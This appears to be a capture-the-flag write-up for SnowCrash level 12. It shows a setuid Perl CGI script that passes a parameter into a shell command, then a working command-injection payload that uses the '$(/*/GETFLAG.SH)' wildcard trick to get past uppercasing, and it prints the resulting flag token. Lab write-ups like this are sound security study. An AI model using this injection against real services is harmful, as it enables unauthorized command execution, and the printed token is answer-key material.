# Level 12

- Once logged in, you will see a file `level12.pl`
```
ssh level12@142.93.230.51 -p 4242                     INT ✘  23m 21s 
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          142.93.230.51 10.110.0.2
level12@142.93.230.51's password:
level12@SnowCrash:~$ ls
level12.pl
level12@SnowCrash:~$ ls -ls
total 4
4 -rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

[what is `pl` file?](https://docs.fileformat.com/programming/pl/#:~:text=A%20file%20with%20.,file%20formats%20such%20as%20PHP.)
```
level12@SnowCrash:~$ file level12.pl
level12.pl: setuid setgid a perl script, ASCII text executable
```

let's take a look at the file

```
level12@SnowCrash:~$ ./level12.pl
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_TERMINAL_VERSION = "3.4.15",
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Content-type: text/html

..level12@SnowCrash:~$
```

```
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
The script is basically receives a parameter `x`, enabled by `use CGI qw{param};`, from [CGI.pm module](https://www.cs.ait.ac.th/~on/O/oreilly/perl/perlnut/ch10_01.htm#:~:text=CGI.pm%20is%20a%20Perl,is%20an%20object%2Doriented%20module.) and following `sub`s will be executed.

From the bottom line, where `n(t(param("x"), param("y")));` is called, sub t and will be called in order.

On line `@output = `\``egrep "^$xx" /tmp/xd 2>&1`\``;`, once the argument passed, the commmand substitution can be run (as **egrep** will be executed)

But, make sure `$xx =~ tr/a-z/A-Z/;` the value passed to the paramater is uppercased.

as seen from the script, something is going on port `4646`

```
level12@SnowCrash:~$ nc -zv localhost 4646
Connection to localhost 4646 port [tcp/*] succeeded!
```

```
level12@SnowCrash:~$ vi /tmp/GETFLAG.SH
level12@SnowCrash:~$ cat /tmp/GETFLAG.SH
#!/bin/bash

/bin/getflag > /tmp/output
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG.SH
level12@SnowCrash:~$
```

and send the parameter.

```
level12@SnowCrash:~$ curl 'http://localhost:4646/?x=$(/*/GETFLAG.SH)'
..level12@SnowCrash:~$ cat /tmp/output
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

**As linux is case sensitive, the command itself cannot be passed directly, nor the absolute path of the script cannot be send, so using wildcard enables to find the file within the level of the path**

